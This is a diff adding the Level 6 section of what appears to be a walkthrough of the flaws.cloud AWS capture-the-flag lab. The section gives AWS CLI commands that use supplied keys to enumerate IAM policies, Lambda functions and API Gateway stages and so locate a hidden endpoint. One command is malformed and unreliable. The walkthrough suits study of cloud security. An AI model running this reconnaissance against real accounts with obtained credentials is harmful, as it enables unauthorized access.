@@ -501,7 +501,65 @@ Found an interesting path, ddcc78ff/, appended to the URL which got us to Level 
 
 #### Level 6
 
+> For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.
 
+Create a new profile with the provided keys:
+
+```bash
+C:\>aws configure --profile flaws-l6
+AWS Access Key ID [None]: <ACCESS KEY ID>
+AWS Secret Access Key [None]: <SECRET ACCESS KEY>
+Default region name [None]: us-west-2
+Default output format [None]:
+```
+
+Get the user info from the created profile:
+
+<pre class="language-bash"><code class="lang-bash"><strong># Option 1
+</strong><strong>C:\>aws --profile flaws-l6 sts get-caller-identity
+</strong>{
+    "UserId": "&#x3C;USER ID>",
+    "Account": "975426262029",
+    "Arn": "arn:aws:iam::975426262029:user/Level6"
+}
+# Option 2
+C:\>aws --profile flaws-l6 iam get-user
+{
+    "User": {
+        "Path": "/",
+        "UserName": "Level6",
+        "UserId": "&#x3C;USER ID>",
+        "Arn": "arn:aws:iam::975426262029:user/Level6",
+        "CreateDate": "2017-02-26T23:11:16+00:00"
+    }
+}
+</code></pre>
+
+Enumerate user policies, roles, etc.:
+
+```bash
+C:\>aws --profile flaws-l6 iam list-attached-user-policies --user-name Level6
+...
+C:\>aws --profile flaws-l6 iam list-attached-role--policies --user-name Level6
+...
+C:\>aws --profile flaws-l6 iam list-attached-role-policies --role-name Level6
+...
+C:\>aws --profile flaws-l6 iam get-policy --policy-arn <ARN>
+...
+```
+
+Enumerate interesting information such as found services:
+
+```bash
+C:\>aws --profile flaws-l6 lambda list-functions
+...
+C:\>aws --profile flaws-l6 lambda get-policy --function-name Level6
+...
+C:\>aws --profile flaws-l6 apigateway get-stages --rest-api-id s33ppypa75
+...
+```
+
+Got the necessary details to make the API request and navigated to [https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6](https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6) to get the file Level URL.
 
 ### CloudGoat
 
